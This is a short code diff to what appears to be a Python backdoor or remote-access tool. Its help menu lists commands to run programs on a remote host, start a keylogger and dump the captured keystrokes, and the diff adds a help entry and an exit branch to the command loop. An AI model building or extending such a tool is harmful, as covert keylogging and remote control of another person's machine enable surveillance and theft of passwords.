@@ -39,6 +39,7 @@ OPTIONS:
     start <path>    --> starts the app in the remote host
     keylog_start    --> starts the keylogger
     keylog_dump     --> dumps the content collected by the keylogger
+    help            --> shows this help menu
     q               --> quit
     
 #########################################################################################
@@ -103,6 +104,8 @@ def shell(_s):
             # print(colored('[-] Instruction to close sent from the server', 'red'))
             # _s.close()
             continue
+        elif cmd == 'exit':
+            break
         elif cmd[:5] == 'help':
             reliable_send(_s, get_help())
         elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
